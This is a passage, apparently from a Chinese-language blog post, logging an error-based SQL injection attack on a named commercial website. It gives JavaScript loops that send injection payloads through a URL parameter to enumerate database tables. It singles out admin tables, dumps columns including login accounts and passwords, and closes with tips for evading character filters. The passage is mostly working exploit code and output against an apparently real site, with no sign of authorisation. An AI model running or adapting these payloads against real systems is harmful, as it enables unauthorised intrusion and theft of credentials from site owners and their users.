  "PrvdChargeEasy2",
  "Pos2",
  "ItemBomDetail",
];
```

卡在 querystring 太長，所以要換個策略

19. 分成 a-z + 非 a-z 提取 table_name，如果還是太多，可以再細分 aa 開頭 ~ az 開頭，理論上是可以窮舉出所有 table_name

```js
const table_names = [];
const fixedUrl = `https://xl-stationer.com.tw/_Models/mItemList.asp?ClsUpId=';SELECT 1/name FROM sysobjects WHERE xtype LIKE 'U' AND name BETWEEN 'A' AND 'Az'--`;
async function main() {
  for (let i = 0; i < 40; i++) {
    const andSyntax = table_names
      .map((table_name) => ` AND name NOT LIKE '${table_name}'`)
      .join("");
    const fullUrl = `${fixedUrl}${andSyntax}--`;
    const res = await fetch(fullUrl);
    const text = await res.text();
    const table_name = text.split("'")[1] === "80004005" && text.split("'")[3];
    if (table_name) table_names.push(table_name);
    else break;
  }
  console.log("end");
}
```

結果 A 開頭的 table_name 超級多...

```js
[
  "AccDoc",
  "AccPeremDelDetail",
  "AccPeremDetail",
  "AccProj",
  "Acc",
  "AccProjBak",
  "AccHistory",
  "AccSum",
  "AccItem",
  "AttendancePunch",
  "Account_Counter",
  "AttendancePunchClass",
  "AttendancePunchMatrix",
  "AttendancePunchMatrixResult",
  "AREA",
  "AccMemo",
  "AttendancePunchMatrixTemp",
  "AccPeremXL",
  "AccMon",
  "AccLite",
  "AccLiteDetail",
  "AddValueDetail",
  "Absent",
  "absent_type",
  "AccAdj",
  "AccClear",
  "AccCls",
  "AccClsUp",
  "AccDay",
  "AccDepa",
  "AccDepaXL",
  "AccDetail",
  "AccDetailXL",
  "AccPerem",
  "AccPeremDel",
  "AccXL",
  "AddValue",
  "AdjPriceBath",
  "AdjRsn",
  "AdminLoginLog",
];
```

感覺可以優先查詢 Admin 相關的 table_name

20. 查詢 Admin 相關的 table_name

```js
const table_names = [];
const fixedUrl = `https://xl-stationer.com.tw/_Models/mItemList.asp?ClsUpId=';SELECT 1/name FROM sysobjects WHERE xtype LIKE 'U' AND name LIKE '%25admin%25'`;
async function main() {
  for (let i = 0; i < 40; i++) {
    const andSyntax = table_names
      .map((table_name) => ` AND name NOT LIKE '${table_name}'`)
      .join("");
    const fullUrl = `${fixedUrl}${andSyntax}--`;
    const res = await fetch(fullUrl);
    const text = await res.text();
    const table_name = text.split("'")[1] === "80004005" && text.split("'")[3];
    if (table_name) table_names.push(table_name);
    else break;
  }
  console.log("end");
}
```

結果

```js
["AdminLoginLog", "AdminMenu"];
```

21. 查詢 AdminMenu 的 column_name

```js
const result = [];
const fixedUrl = `https://xl-stationer.com.tw/_Models/mItemList.asp?ClsUpId=';SELECT 1/column_name FROM information_schema.columns WHERE table_name LIKE 'AdminMenu'`;
async function main() {
  for (let i = 0; i < 40; i++) {
    const andSyntax = result
      .map((item) => ` AND column_name NOT LIKE '${item}'`)
      .join("");
    const fullUrl = `${fixedUrl}${andSyntax}--`;
    const res = await fetch(fullUrl);
    const text = await res.text();
    const item = text.split("'")[1] === "80004005" && text.split("'")[3];
    if (item) result.push(item);
    else break;
  }
  console.log("end");
}
```

結果

```js
["id", "pid", "title", "url", "sort", "pic", "hidden", "recdate", "mtype"];
```

22. 查詢 AdminLoginLog 的 column_name

```js
const result = [];
const fixedUrl = `https://xl-stationer.com.tw/_Models/mItemList.asp?ClsUpId=';SELECT 1/column_name FROM information_schema.columns WHERE table_name LIKE 'AdminLoginLog'`;
async function main() {
  for (let i = 0; i < 40; i++) {
    const andSyntax = result
      .map((item) => ` AND column_name NOT LIKE '${item}'`)
      .join("");
    const fullUrl = `${fixedUrl}${andSyntax}--`;
    const res = await fetch(fullUrl);
    const text = await res.text();
    const item = text.split("'")[1] === "80004005" && text.split("'")[3];
    if (item) result.push(item);
    else break;
  }
  console.log("end");
}
```

結果

```js
["id", "acc", "pass", "ip", "act", "recdate"];
```

## 學到的東西

1. `top 100 percent` => 等於全選
2. 不能用 `(`, `)`, `=`, `>`, `<` 的情況，可以用以下方式來提取資料

- `column_name LIKE '%25SearchString%25'`
- `1/not-number-column_name`

3. 不能用 `.` 的情況，可以用 `SELECT name FROM sysobjects WHERE xtype LIKE 'U'` 來提取 table_name
